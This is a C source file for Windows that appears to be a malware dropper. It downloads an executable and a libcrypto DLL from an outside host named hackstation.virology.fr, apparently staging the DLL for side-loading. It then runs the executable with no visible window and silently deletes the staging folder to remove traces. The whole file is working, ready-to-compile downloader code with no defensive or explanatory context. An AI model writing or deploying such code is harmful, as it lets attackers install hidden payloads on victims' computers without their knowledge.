#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <shlwapi.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

int DownloadFile(const char* url, const char* destPath) {
    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed with error: %lu\n", GetLastError());
        return 1;
    }

    HINTERNET hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        printf("InternetOpenUrl failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    FILE* file = fopen(destPath, "wb");
    if (!file) {
        printf("Failed to open destination file: %s\n", destPath);
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return 1;
    }

    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }

    fclose(file);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    printf("Downloaded %s to %s\n", url, destPath);
    return 0;
}

int RemoveDirectoryRecursively(const char* dirPath) {
    SHFILEOPSTRUCT fileOp = {0};
    char path[MAX_PATH];

    snprintf(path, sizeof(path), "%s\\*", dirPath);
    path[strlen(path) + 1] = 0;

    fileOp.wFunc = FO_DELETE;
    fileOp.pFrom = path;
    fileOp.fFlags = FOF_NO_UI | FOF_NOCONFIRMATION | FOF_SILENT;

    int ret = SHFileOperation(&fileOp);
    if (ret != 0) {
        printf("Failed to delete directory %s with error: %d\n", dirPath, ret);
        return 1;
    }
    printf("Successfully deleted directory: %s\n", dirPath);
    return 0;
}

// int main() {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char* installerUrl = "http://hackstation.virology.fr:8080/installer.exe";
    const char* dllUrl = "http://hackstation.virology.fr:8080/libcrypto-3-x64.dll";
    const char* tempFolder = "C:\\Temp\\Cython";
    const char* installerPath = "C:\\Temp\\Cython\\installer.exe";
    const char* dllPath = "C:\\Temp\\05ft8_2lthb4\\libcrypto-3-x64.dll";
    const char* newFolder = "C:\\Temp\\05ft8_2lthb4";
    const char* newDllPath = "C:\\Temp\\05ft8_2lthb4\\libcrypto-3-x64.dll";

    if (!PathFileExists(tempFolder)) {
        CreateDirectory(tempFolder, NULL);
    }
    
    if (!PathFileExists(newFolder)) {
        CreateDirectory(newFolder, NULL);
    }

    if (DownloadFile(installerUrl, installerPath) != 0) {
        return 1;
    }

    if (DownloadFile(dllUrl, dllPath) != 0) {
        return 1;
    }

    if (!MoveFile(dllPath, newDllPath)) {
        return 1;
    }

    // system(installerPath);
    
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcess(installerPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (RemoveDirectoryRecursively(tempFolder) != 0) {
        return 1;
    }

    return 0;
}
